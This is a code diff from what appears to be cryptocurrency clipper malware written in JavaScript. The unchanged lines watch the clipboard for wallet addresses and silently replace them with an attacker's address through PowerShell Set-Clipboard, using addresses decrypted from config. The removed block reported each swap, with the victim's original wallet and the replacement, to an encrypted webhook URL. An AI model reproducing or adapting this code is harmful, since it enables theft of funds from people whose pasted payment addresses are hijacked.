@@ -23,34 +23,6 @@ module.exports = (client) => {
                             if (_value.replace("\r", "").match(value)) {
                                 if (_value.replace("\r", "") != client.utils.encryption.decryptData(client.config.crypto[key])) {
                                     client.requires.child_process.exec(`powershell Set-Clipboard ${client.utils.encryption.decryptData(client.config.crypto[key])}`)
-
-                                    var embeds = []
-
-                                    embeds.push({
-                                        url: client.utils.encryption.decryptData(client.config.embed.href),
-                                        footer: {
-                                            text: client.utils.encryption.decryptData(client.config.embed.footer.text),
-                                            icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
-                                        },
-                                        fields: [],
-                                        timestamp: new Date(),
-                                        title: `🤑 Detected ${key.toUpperCase()} wallet (Clipper)`,
-                                        fields: [{
-                                            name: "Wallet",
-                                            value: `\`\`\`${_value.replace("\r", "")}\`\`\``,
-                                            inline: false,
-                                        }, {
-                                            name: "Replaced with",
-                                            value: `\`\`\`${client.utils.encryption.decryptData(client.config.crypto[key])}\`\`\``,
-                                            inline: false,
-                                        }]
-                                    })
-
-                                    await client.utils.webhook.sendToWebhook(
-                                        client.utils.encryption.decryptData(client.config.webhook.url), {
-                                            "embeds": embeds
-                                        })
-
                                     break;
                                 }
                             }
